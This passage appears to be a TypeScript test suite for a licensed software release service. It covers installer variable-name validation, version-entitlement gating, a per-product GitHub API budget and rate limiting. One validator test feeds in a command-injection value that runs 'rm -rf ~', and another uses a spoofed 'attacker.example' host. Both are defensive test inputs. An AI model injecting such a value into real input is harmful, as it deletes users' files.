//       identifier, so `validateInstallContext` failed and the surface 404'd.
//   (b) LENGTH. `binaryName` may be 64 characters; `<NAME>_VERSION` is 8 longer, over the old
//       64-character bound. Every name of 57-64 characters 404'd.
// Both were permanent: nothing about the request changed the answer.

describe("a manifest-legal binaryName permanently 404s install.sh", () => {
  /** The manifest validator's rule, verbatim from `shared-manifest/src/index.ts`. */
  const MANIFEST_BINARY_NAME_RE = /^[A-Za-z0-9][A-Za-z0-9._-]{0,63}$/;

  async function installFor(binaryName: string): Promise<Response> {
    const db = makeTestDb();
    await seedReleaseConfig(db, { binary_name: binaryName });
    const { fetchImpl } = stubFetch([]);
    return handleRelease(
      req("https://key.plrs.im/djdl/install.sh"),
      envFor(),
      db,
      makeProduct(),
      "install",
      {},
      fetchImpl,
    );
  }

  // A leading digit is genuinely not a POSIX shell identifier, so the regex was right and the
  // derivation was wrong: the fix prefixes `_` rather than loosening the class.
  it("a binaryName starting with a digit serves an installer instead of a 404", async () => {
    const name = "7zip";
    expect(MANIFEST_BINARY_NAME_RE.test(name)).toBe(true);
    const res = await installFor(name);
    expect(res.status).toBe(200);
    const script = await res.text();
    expect(script).toContain("_7ZIP_VERSION");
    // Never the un-prefixed form ANYWHERE: `7ZIP_VERSION=1.2.3 sh` is a COMMAND named
    // `7ZIP_VERSION=…`, not an assignment, so an installer that emitted it would be quietly
    // broken even if the renderer had agreed to emit it.
    expect(script).not.toMatch(/(?:^|[^A-Za-z0-9_])7ZIP_VERSION/m);
    expect(script).toContain('VERSION="${_7ZIP_VERSION:-latest}"');
  });

  // 64 characters is exactly what the manifest admits; the derived name is 72.
  it("a maximum-length binaryName serves an installer instead of a 404", async () => {
    const name = "a".repeat(64);
    expect(MANIFEST_BINARY_NAME_RE.test(name)).toBe(true);
    const res = await installFor(name);
    expect(res.status).toBe(200);
    expect(await res.text()).toContain(`${"A".repeat(64)}_VERSION`);
  });

  it("a 64-character name starting with a digit reaches the 73-character bound and still renders", async () => {
    const name = `9${"b".repeat(63)}`;
    expect(MANIFEST_BINARY_NAME_RE.test(name)).toBe(true);
    expect(deriveVersionEnv(name)).toHaveLength(73);
    const res = await installFor(name);
    expect(res.status).toBe(200);
    expect(await res.text()).toContain(`_9${"B".repeat(63)}_VERSION`);
  });

  // One rule, so the property holds for the WHOLE class rather than for the cases someone
  // remembered: every string the manifest admits derives a name the installer admits.
  it("EVERY manifest-legal binaryName derives an installer-legal versionEnv", () => {
    const names = [
      "a",
      "Z",
      "0",
      "9",
      "7zip",
      "djdl",
      "my.tool",
      "my-tool",
      "my_tool",
      "0-._-.0",
      "a".repeat(64),
      `9${"b".repeat(63)}`,
      `${"x".repeat(63)}9`,
    ];
    for (const name of names) {
      expect(MANIFEST_BINARY_NAME_RE.test(name), name).toBe(true);
      const env = deriveVersionEnv(name);
      // The shell-identifier rule, verbatim from `install.ts`.
      expect(
        /^[A-Za-z_][A-Za-z0-9_]{0,72}$/.test(env),
        `${name} -> ${env}`,
      ).toBe(true);
      expect(
        validateInstallContext({
          origin: "https://key.plrs.im",
          cliBase: "/djdl/release/dl",
          installPath: "/djdl/release/install.sh",
          binaryName: name,
          channels: ["staging", "beta"],
          versionEnv: env,
        }),
      ).toBeNull();
    }
  });

  it("an unsafe versionEnv is still refused", () => {
    const ctx = {
      origin: "https://key.plrs.im",
      cliBase: "/djdl/release/dl",
      installPath: "/djdl/release/install.sh",
      binaryName: "djdl",
      channels: ["staging", "beta"],
    };
    for (const versionEnv of [
      "7ZIP_VERSION",
      "BAD-NAME_VERSION",
      "X; rm -rf ~ #_VERSION",
      "A".repeat(74),
    ])
      expect(
        validateInstallContext({ ...ctx, versionEnv }),
        versionEnv,
      ).toMatch(/^unsafe versionEnv/);
  });
});

// `entitled` evaluated the version window BEFORE the selector resolved, so it only ran for a
// pinned path
// ═════════════════════════════════════════════════════════════════════════════

// `entitledSelectorFor` can only populate `version` for a PINNED selector, so the gateway, which
// runs before the selector resolves, evaluated the caller's window for `/release/dl/2.0.0/…` and
// skipped it for `latest`, `stable`, a channel and a bare appcast. The ceiling was a property of
// the URL's SHAPE: the same caller, refused the pinned path, got the identical artifact by
// swapping one segment. The release a moving selector resolved to is now held to the window,
// in the `403 version_blocked` + `allowedRange` shape the pinned path answers with.
describe("entitled: the version window holds for a moving selector", () => {
  /** A release list whose newest stable is 2.0.0, plus a beta above it. */
  const STABLE_2 = release({
    tag_name: "v2.0.0",
    assets: [asset("djdl-2.0.0-arm64.dmg", 91), asset("djdl-arm64", 92)],
  });
  const STABLE_1 = release({
    tag_name: "v1.0.0",
    published_at: "2025-01-01T00:00:00Z",
    assets: [asset("djdl-1.0.0-arm64.dmg", 93), asset("djdl-arm64", 94)],
  });
  const BETA_3 = release({
    tag_name: "v3.0.0-beta.1",
    prerelease: true,
    published_at: "2026-03-01T00:00:00Z",
    assets: [asset("djdl-3.0.0-beta.1-beta-arm64.dmg", 95)],
  });

  function releaseListFetch(): FetchImpl {
    return stubFetch([
      [
        "/releases?per_page",
        () =>
          new Response(JSON.stringify([BETA_3, STABLE_2, STABLE_1]), {
            status: 200,
          }),
      ],
      [
        "/releases/tags/",
        () => new Response(JSON.stringify(STABLE_2), { status: 200 }),
      ],
    ]).fetchImpl;
  }

  /** The product with unsigned feeds, plus an activated device on a licence with `grant`. */
  async function world(
    access: Record<string, unknown>,
    grant: Parameters<typeof seedLicenseWithKey>[2] = {},
  ): Promise<{ db: Db; env: Env; product: Product; token: string }> {
    const db = makeTestDb();
    // No channel workflow, so `beta` resolves through the prerelease heuristic rather than an
    // Actions lookup this stub does not serve.
    await seedReleaseConfig(db, {
      sparkle_ed25519_pub: null,
      channel_workflow: null,
      ...access,
    });
    // The signature requirement is OPERATOR policy: opt out so the appcast renders and the
    // tests are about the access decision, not the enclosure.
    await seedOperatorPolicy(
      db,
      SLUG,
      JSON.stringify({ requireSparkleSignature: false }),
    );
    const env = envFor();
    const product = (await loadProduct(env, db, SLUG))!;
    const { key } = await seedLicenseWithKey(db, SLUG, grant);
    const activated = await handleActivate(
      mkReq("POST", {
        authorization: `Bearer ${key}`,
        "x-pkey-device": "dev-window",
      }),
      env,
      db,
      product,
      NOW,
    );
    expect(activated.status).toBe(200);
    const { token } = (await activated.json()) as { token: string };
    return { db, env, product, token };
  }

  function authed(url: string, token: string): Request {
    return new Request(url, {
      headers: { authorization: `Bearer ${token}` },
    }) as unknown as Request;
  }

  const BLOCKED = {
    error: { code: "version_blocked" },
    // The SAME body the pinned path answers with: clients parse this shape.
    allowedRange: { min: "0.0.0", max: "1.5.0" },
  };

  it("blocks `latest` for a caller whose grant caps below the newest release, exactly as the pinned path does", async () => {
    const { db, env, product, token } = await world(
      { artifacts_access: "entitled" },
      { maxVersion: "1.5.0" },
    );
    for (const [kind, name, version] of [
      ["dmg", "djdl-arm64.dmg", "latest"],
      ["cli", "djdl-arm64", "latest"],
      // The control: the pinned spelling of the same release was already refused.
      ["dmg", "djdl-arm64.dmg", "2.0.0"],
    ] as const) {
      const res = await handleRelease(
        authed(`https://key.plrs.im/djdl/release/dl/${version}/${name}`, token),
        env,
        db,
        product,
        kind,
        { version, arch: "arm64" },
        releaseListFetch(),
      );
      expect(res.status, `${kind} ${version}`).toBe(403);
      expect(await res.json(), `${kind} ${version}`).toEqual(BLOCKED);
    }
  });

  it("blocks the bare appcast, which names no version at all", async () => {
    const { db, env, product, token } = await world(
      { artifacts_access: "entitled" },
      { maxVersion: "1.5.0" },
    );
    const res = await handleRelease(
      authed("https://key.plrs.im/djdl/update/appcast.xml", token),
      env,
      db,
      product,
      "appcast",
      { arch: "arm64" },
      releaseListFetch(),
    );
    expect(res.status).toBe(403);
    expect(await res.json()).toEqual(BLOCKED);
  });

  it("blocks the CHANNEL appcast for a beta-entitled caller who is version-capped", async () => {
    // The channel gate passes (the grant names `beta`) and the version gate is all that is left:
    // the combination the pre-resolution check could not evaluate.
    const { db, env, product, token } = await world(
      { artifacts_access: "entitled" },
      { channels: ["beta"], maxVersion: "2.5.0" },
    );
    const res = await handleRelease(
      authed("https://key.plrs.im/djdl/update/beta/appcast.xml", token),
      env,
      db,
      product,
      "channelAppcast",
      { channel: "beta", arch: "arm64" },
      releaseListFetch(),
    );
    expect(res.status).toBe(403);
    expect(await res.json()).toMatchObject({
      error: { code: "version_blocked" },
      allowedRange: { max: "2.5.0" },
    });
  });

  it("blocks /update/version, which ADVERTISES the release it may not serve", async () => {
    const { db, env, product, token } = await world(
      { metadata_access: "entitled" },
      { maxVersion: "1.5.0" },
    );
    const res = await handleRelease(
      authed("https://key.plrs.im/djdl/update/version", token),
      env,
      db,
      product,
      "version",
      { version: "latest" },
      releaseListFetch(),
    );
    expect(res.status).toBe(403);
    expect(await res.json()).toEqual(BLOCKED);
  });

  // REGRESSION GUARD: over-blocking breaks every legitimate updater on an `entitled` product.
  it("still serves the moving selector to a caller INSIDE the window", async () => {
    const { db, env, product, token } = await world(
      { artifacts_access: "entitled", metadata_access: "entitled" },
      { maxVersion: "9.0.0" },
    );
    const feed = await handleRelease(
      authed("https://key.plrs.im/djdl/update/appcast.xml", token),
      env,
      db,
      product,
      "appcast",
      { arch: "arm64" },
      releaseListFetch(),
    );
    expect(feed.status).toBe(200);
    expect(await feed.text()).toContain("djdl-2.0.0-arm64.dmg");
    const version = await handleRelease(
      authed("https://key.plrs.im/djdl/update/version", token),
      env,
      db,
      product,
      "version",
      { version: "latest" },
      releaseListFetch(),
    );
    expect(version.status).toBe(200);
    expect(((await version.json()) as { version: string }).version).toBe(
      "2.0.0",
    );
    const dl = await handleRelease(
      authed(
        "https://key.plrs.im/djdl/release/dl/latest/djdl-arm64.dmg",
        token,
      ),
      env,
      db,
      product,
      "dmg",
      { version: "latest", arch: "arm64" },
      releaseListFetch(),
    );
    // Not 200 only because the stub serves no asset BYTES: the access decision let it through.
    expect(dl.status).not.toBe(403);
  });

  // The mode is opt-in: a `public` product pays nothing for any of this.
  it("does not touch a product that has not opted in", async () => {
    const { db, env, product } = await world({}, { maxVersion: "0.0.1" });
    for (const [kind, url, params] of [
      [
        "version",
        "https://key.plrs.im/djdl/update/version",
        { version: "latest" },
      ],
      [
        "dmg",
        "https://key.plrs.im/djdl/release/dl/latest/djdl-arm64.dmg",
        { version: "latest", arch: "arm64" as const },
      ],
    ] as const) {
      const res = await handleRelease(
        req(url),
        env,
        db,
        product,
        kind,
        params,
        releaseListFetch(),
      );
      expect(res.status, kind).not.toBe(403);
      expect(res.status, kind).not.toBe(401);
    }
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// The per-product upstream budget
// ═════════════════════════════════════════════════════════════════════════════
//
// The per-IP release lanes bound what ONE address costs, and every one of them is keyed on the
// caller, so the cheapest way round them is more source addresses. Nothing counted what the
// PRODUCT spends, which is the only number the GitHub installation quota cares about, and
// exhausting that quota turns every download, appcast and `install.sh` of every product on the
// installation into a refusal. A download is also two API calls, not one (the selector, then the
// asset), so an artifact lane sized as if a request were one call sat above the quota it defends.
//
// So every `api.github.com` call a release surface issues is charged to one bucket per product
// (`releaseUpstream`, 4,000 an hour) at the fetch seam, and the per-address artifact lane is held
// under that budget on its own. GREEN when a flood cannot spend more than the product's own
// budget, however many addresses it comes from.

/** The product's whole upstream budget for the hour `NOW` falls in, spent. */
async function spendUpstreamBudget(env: Env): Promise<void> {
  const rl = { bucket: "releaseUpstream", id: SLUG, ...UPSTREAM_RATE_LIMIT };
  for (let i = 0; i < UPSTREAM_RATE_LIMIT.limit; i++)
    await rateLimitOk(env, SLUG, rl, NOW);
  expect(await rateLimitOk(env, SLUG, rl, NOW)).toBe(false);
}

/** An artifact request attributed to `ip` — `cf-connecting-ip` is what `clientIp` reads. */
function fromIp(ip: string): Request {
  return new Request("https://key.plrs.im/djdl/release/dl/1.2.3/djdl-arm64", {
    headers: { "cf-connecting-ip": ip },
  }) as unknown as Request;
}

/**
 * A GitHub stub that counts what GitHub bills (`api.github.com` calls) apart from the signed
 * storage hop an asset read is redirected to, which is not billed to the App's REST quota.
 */
function billedStub(
  rel: Release,
  opts: { redirect?: boolean } = {},
): { fetchImpl: FetchImpl; seen: { api: number; storage: number } } {
  const seen = { api: 0, storage: 0 };
  const fetchImpl: FetchImpl = async (input) => {
    const url = String(input);
    const host = new URL(url).hostname;
    if (host === "api.github.com") seen.api += 1;
    else seen.storage += 1;
    if (url.includes("/access_tokens"))
      return new Response(JSON.stringify({ token: "ghs_installation_token" }), {
        status: 200,
      });
    if (url.includes("/releases/tags/"))
      return new Response(JSON.stringify(rel), { status: 200 });
    if (url.includes("/releases/assets/"))
      return opts.redirect
        ? new Response(null, {
            status: 302,
            headers: {
              location:
                "https://objects.githubusercontent.com/github-production-release-asset/777?X-Amz-Expires=300",
            },
          })
        : new Response("BINARY", { status: 200 });
    if (host === "objects.githubusercontent.com")
      return new Response("BINARY", { status: 200 });
    return new Response("not found", { status: 404 });
  };
  return { fetchImpl, seen };
}

/** Run `fn` with a Cache API bound to `globalThis`, as workerd provides it. */
async function withEdgeCache<T>(fn: () => Promise<T>): Promise<T> {
  const store = new Map<string, Response>();
  const g = globalThis as { caches?: unknown };
  const prior = g.caches;
  g.caches = {
    default: {
      match: async (r: Request) => store.get(r.url)?.clone(),
      put: async (r: Request, res: Response) => {
        store.set(r.url, res);
      },
    },
  };
  try {
    return await fn();
  } finally {
    if (prior === undefined) delete g.caches;
    else g.caches = prior;
  }
}

describe("the per-product upstream budget", () => {
  // The budget is a fixed hour. Pinning the clock keeps a long flood from straddling a window
  // edge, and makes the Retry-After a known number.
  beforeEach(() => {
    vi.useFakeTimers({ toFake: ["Date"], now: NOW * 1000 });
  });
  afterEach(() => {
    vi.useRealTimers();
  });

  it("an artifact flood from rotating addresses cannot spend more GitHub calls than the product's budget", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db, { channel_workflow: null });
    const env = envFor();
    const rel = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777)],
    });
    const { fetchImpl, seen } = billedStub(rel);

    // Two GitHub calls per request, so this flood is worth ~5% MORE than the budget allows.
    // Every request names a version nothing has resolved yet (so the resolution cache never
    // absorbs it) and comes from a different address (so no per-address lane ever fires): the
    // one thing left to stop it is the product's own budget.
    const flood = Math.ceil(UPSTREAM_RATE_LIMIT.limit / 2) + 100;
    const statuses: number[] = [];
    for (let i = 0; i < flood; i++) {
      const res = await handleRelease(
        fromIp(`198.51.100.${i % 250}`),
        env,
        db,
        makeProduct(),
        "cli",
        { version: `1.2.${i}`, arch: "arm64" },
        fetchImpl,
      );
      statuses.push(res.status);
    }

    // THE ASSERTION THAT MATTERS: a count of GitHub calls, not a wall-clock measurement. The
    // budget is charged once per call and checked BEFORE the call leaves, so it is an exact
    // ceiling, not an approximation.
    expect(seen.api).toBe(UPSTREAM_RATE_LIMIT.limit);
    // …and the flood really did try to spend more than that.
    expect(flood * 2).toBeGreaterThan(UPSTREAM_RATE_LIMIT.limit);

    // No 429 anywhere: the per-address lanes never fired, so the bound above is the PRODUCT
    // budget and nothing else.
    expect(statuses.filter((s) => s === 429)).toEqual([]);
    // Past the budget the answer is a 503, never the 404 a withdrawn release gets.
    expect(statuses.filter((s) => s === 404)).toEqual([]);
    expect(statuses.filter((s) => s === 503).length).toBeGreaterThan(0);
    expect(statuses.at(-1)).toBe(503);
    // Serving the early ones is the point: this is a delivery path, not a tarpit.
    expect(statuses.filter((s) => s === 200).length).toBeGreaterThan(1000);

    // An exhausted quota is a PLATFORM condition, so it wears the same 503 shape GitHub's own
    // refusal maps to: a Retry-After for the wait, and never cached.
    const refused = await handleRelease(
      fromIp("203.0.113.9"),
      env,
      db,
      makeProduct(),
      "cli",
      { version: "9.9.9", arch: "arm64" },
      fetchImpl,
    );
    expect(refused.status).toBe(503);
    expect(refused.headers.get("cache-control")).toBe("no-store");
    expect(refused.headers.get("retry-after")).toBe(
      String(
        UPSTREAM_RATE_LIMIT.windowSec - (NOW % UPSTREAM_RATE_LIMIT.windowSec),
      ),
    );
    expect(await refused.json()).toMatchObject({
      error: "upstream_rate_limited",
    });
    // Still no further spend: the budget cannot be re-borrowed by asking again.
    expect(seen.api).toBe(UPSTREAM_RATE_LIMIT.limit);
  }, 120_000);

  it("charges every api.github.com call and none of the storage hop behind it", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db, { channel_workflow: null });
    const env = envFor();
    const checks = recordLimiterChecks(env);
    const rel = release({
      tag_name: "v1.2.3",
      assets: [asset("djdl-arm64", 777)],
    });
    // The asset read redirects into GitHub's storage host, as GitHub's does.
    const { fetchImpl, seen } = billedStub(rel, { redirect: true });

    // The second request's signed URL is cached, so it reads the storage host without a
    // second API call for the asset.
    for (const version of ["1.2.3", "1.2.4"]) {
      const res = await handleRelease(
        fromIp("198.51.100.1"),
        env,
        db,
        makeProduct(),
        "cli",
        { version, arch: "arm64" },
        fetchImpl,
      );
      expect(res.status).toBe(200);
      expect(await res.text()).toBe("BINARY");
    }

    expect(seen.storage).toBeGreaterThan(0);
    // One check per call GitHub bills, to this product's bucket, keyed on the product and not
    // on the caller…
    const charges = checks.filter((c) => c.bucket === "releaseUpstream");
    expect(charges).toHaveLength(seen.api);
    for (const c of charges)
      expect(c).toMatchObject({ id: SLUG, ...UPSTREAM_RATE_LIMIT });
    // …beside the per-address lane, which is a different bucket keyed on the caller.
    expect(
      checks.filter((c) => c.bucket === "releaseArtifact").map((c) => c.id),
    ).toEqual(["198.51.100.1", "198.51.100.1"]);
  });

  it("answers a spent budget on a metadata surface with the same 503, before anything leaves the isolate", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db);
    const env = envFor();
    await spendUpstreamBudget(env);
    const { fetchImpl, calls } = stubFetch([]);

    const res = await handleRelease(
      req("https://key.plrs.im/djdl/update/version"),
      env,
      db,
      makeProduct(),
      "version",
      { version: "1.2.3" },
      fetchImpl,
    );
    expect(res.status).toBe(503);
    expect(res.headers.get("cache-control")).toBe("no-store");
    expect(res.headers.get("retry-after")).toBe(
      String(
        UPSTREAM_RATE_LIMIT.windowSec - (NOW % UPSTREAM_RATE_LIMIT.windowSec),
      ),
    );
    expect(await res.json()).toMatchObject({ error: "upstream_rate_limited" });
    expect(calls).toEqual([]);
  });

  it("serves a cached answer ahead of the limiter, charging neither budget, even once the product's budget is spent", async () => {
    const db = makeTestDb();
    await seedReleaseConfig(db, { channel_workflow: null });
    const env = envFor();
    const rel = release({ tag_name: "v1.2.3" });
    const { fetchImpl } = stubFetch([
      [
        "/releases?per_page",
        () => new Response(JSON.stringify([rel]), { status: 200 }),
      ],
    ]);
    await withEdgeCache(async () => {
      const versionCheck = async (version: string): Promise<number> =>
        (
          await handleRelease(
            req("https://key.plrs.im/djdl/update/version"),
            env,
            db,
            makeProduct(),
            "version",
            { version },
            fetchImpl,
          )
        ).status;

      // A miss fills the cache; then the product's whole budget goes.
      expect(await versionCheck("latest")).toBe(200);
      await spendUpstreamBudget(env);

      const checks = recordLimiterChecks(env);
      for (let i = 0; i < 10; i++)
        expect(await versionCheck("latest")).toBe(200);
      // Ten hits that touched neither the per-address lane nor the product's budget…
      expect(checks).toEqual([]);
      // …while a selector nobody has cached meets the spent budget.
      expect(await versionCheck("9.9.9")).toBe(503);
    });
  });

  describe("the catalog's GitHub reads", () => {
    const CHAIN: ServicesMap = {
      license: { enabled: true },
      config: { enabled: true },
      release: { enabled: true },
      distribution: { enabled: true },
      update: { enabled: true },
      identity: { enabled: false },
      sync: { enabled: false },
      commerce: { enabled: false },
      connect: { enabled: false },
    };

    /** `releaseCatalog.repositoryPublic` — the portal's gate — with `fetchImpl` as the platform `fetch`. */
    async function repositoryPublic(
      env: Env,
      db: Db,
      fetchImpl: FetchImpl,
    ): Promise<boolean> {
      const catalog = buildHooks(SERVICES, CHAIN, {
        env,
        db,
        product: makeProduct(),
        now: NOW,
      }).releaseCatalog();
      if (!catalog) throw new Error("Release is on, so the catalog exists");
      const saved = globalThis.fetch;
      globalThis.fetch = fetchImpl as typeof fetch;
      try {
        return await catalog.repositoryPublic();
      } finally {
        globalThis.fetch = saved;
      }
    }

    it("charges the portal's repository check: one token mint and one repository read", async () => {
      const db = makeTestDb();
      await seedReleaseConfig(db);
      const env = envFor();
      const checks = recordLimiterChecks(env);
      const seen: string[] = [];
      const fetchImpl: FetchImpl = async (input) => {
        seen.push(String(input));
        return String(input).includes("/access_tokens")
          ? new Response(JSON.stringify({ token: "ghs_installation_token" }), {
              status: 200,
            })
          : new Response(
              JSON.stringify({ private: false, visibility: "public" }),
              {
                status: 200,
              },
            );
      };

      expect(await repositoryPublic(env, db, fetchImpl)).toBe(true);
      expect(seen).toHaveLength(2);
      expect(checks.filter((c) => c.bucket === "releaseUpstream")).toHaveLength(
        2,
      );
    });

    it("answers `not public`, without asking GitHub, once the budget is spent", async () => {
      const db = makeTestDb();
      await seedReleaseConfig(db);
      const env = envFor();
      await spendUpstreamBudget(env);
      const seen: string[] = [];
      const fetchImpl: FetchImpl = async (input) => {
        seen.push(String(input));
        return new Response("{}", { status: 200 });
      };

      expect(await repositoryPublic(env, db, fetchImpl)).toBe(false);
      expect(seen).toEqual([]);
    });
  });
});

describe("meterUpstreamCalls", () => {
  beforeEach(() => {
    vi.useFakeTimers({ toFake: ["Date"], now: NOW * 1000 });
  });
  afterEach(() => {
    vi.useRealTimers();
  });

  it("charges the product's bucket for api.github.com and for nothing else", async () => {
    const env = envFor();
    const checks = recordLimiterChecks(env);
    const reached: string[] = [];
    const metered = meterUpstreamCalls(
      env,
      SLUG,
      NOW,
      async (input: string) => {
        reached.push(input);
        return new Response("ok");
      },
    );
    const urls = [
      // The one billed call.
      "https://api.github.com/repos/acme/djdl/releases/latest",
      // The signed storage hop an asset read is redirected to.
      "https://objects.githubusercontent.com/github-production-release-asset/1",
      // Neither is the API host…
      "https://github.com/acme/djdl/releases/download/v1/djdl",
      "https://uploads.api.github.com/repos/acme/djdl",
      "https://api.github.com.attacker.example/repos/acme/djdl",
      // …and a string that is no URL is passed through, never charged.
      "not a url",
    ];
    for (const url of urls) await metered(url);

    // Every call still reaches the underlying fetch…
    expect(reached).toEqual(urls);
    // …and exactly one was charged, to the product's bucket, keyed on the product.
    expect(checks).toEqual([
      { bucket: "releaseUpstream", id: SLUG, ...UPSTREAM_RATE_LIMIT, now: NOW },
    ]);
  });

  it("reads the URL of a Request as well as a string", async () => {
    const env = envFor();
    const checks = recordLimiterChecks(env);
    const metered = meterUpstreamCalls<Request | string>(
      env,
      SLUG,
      NOW,
      async () => new Response("ok"),
    );
    await metered(
      new Request(
        "https://api.github.com/repos/acme/djdl",
      ) as unknown as Request,
    );
    await metered(
      new Request(
        "https://objects.githubusercontent.com/x",
      ) as unknown as Request,
    );
    expect(checks).toHaveLength(1);
  });

  it("refuses with the wait to the next window once the budget is spent, and never calls through", async () => {
    const env = envFor();
    await spendUpstreamBudget(env);
    let reached = 0;
    const underlying: FetchImpl = async () => {
      reached += 1;
      return new Response("ok");
    };
    const metered = meterUpstreamCalls(env, SLUG, NOW, underlying);

    const refusal = await metered(
      "https://api.github.com/repos/acme/djdl/releases/latest",
    ).catch((err: unknown) => err);
    expect(refusal).toBeInstanceOf(UpstreamRateLimitedError);
    expect((refusal as UpstreamRateLimitedError).retryAfterSeconds).toBe(
      UPSTREAM_RATE_LIMIT.windowSec - (NOW % UPSTREAM_RATE_LIMIT.windowSec),
    );
    expect(reached).toBe(0);

    // The storage host is not metered, so an asset already redirected there still streams.
    await metered("https://objects.githubusercontent.com/signed");
    expect(reached).toBe(1);

    // The next hour is a fresh budget.
    const later = meterUpstreamCalls(
      env,
      SLUG,
      NOW + UPSTREAM_RATE_LIMIT.windowSec,
      underlying,
    );
    expect((await later("https://api.github.com/repos/acme/djdl")).ok).toBe(
      true,
    );
    expect(reached).toBe(2);
  });
});

// ═════════════════════════════════════════════════════════════════════════════
// The release limiter runs before access enforcement
// ═════════════════════════════════════════════════════════════════════════════
//
// Enforcing access first meant a caller the platform refuses paid nothing for being refused. On a
// `licensed` or `entitled` product an unauthenticated client could collect 401s and 403s forever,
// at whatever rate it liked, and enumerate selectors (which versions exist, which channels a
// grant covers) for free. The budget exists to bound work done on behalf of a stranger, and
// deciding to refuse a stranger is work.

describe("the release limiter runs before access enforcement", () => {
  beforeEach(() => {
    vi.useFakeTimers({ toFake: ["Date"], now: NOW * 1000 });
  });
  afterEach(() => {
    vi.useRealTimers();
  });

  it("an unauthenticated caller cannot enumerate a licensed surface for free", async () => {
    const db = makeTestDb();
    // `licensed` metadata: an anonymous caller is refused for every selector it names.
    await seedReleaseConfig(db, { metadata_access: "licensed" });
    const env = envFor();
    const { fetchImpl, calls } = stubFetch([]);
    const probe = async (ip: string, version: string): Promise<number> =>
      (
        await handleRelease(
          new Request(`https://key.plrs.im/djdl/update/version?v=${version}`, {
            headers: { "cf-connecting-ip": ip },
          }) as unknown as Request,
          env,
          db,
          makeProduct(),
          "version",
          { version },
          fetchImpl,
        )
      ).status;

    const statuses: number[] = [];
    for (let i = 0; i < 40; i++)
      statuses.push(await probe("203.0.113.5", `1.2.${i}`));

    // The first 30 are refused on their merits; past the metadata budget the limiter takes
    // over, because being turned away is work the platform did on a stranger's behalf.
    expect(statuses.slice(0, 30).every((s) => s === 401)).toBe(true);
    expect(statuses[30]).toBe(429);
    expect(statuses.at(-1)).toBe(429);
    // Another address is untouched: it is refused on the merits, not limited.
    expect(await probe("203.0.113.6", "1.2.0")).toBe(401);
    // Nothing ever reached GitHub: access is still enforced before a single byte of release
    // state is computed.
    expect(calls).toEqual([]);
  });
});
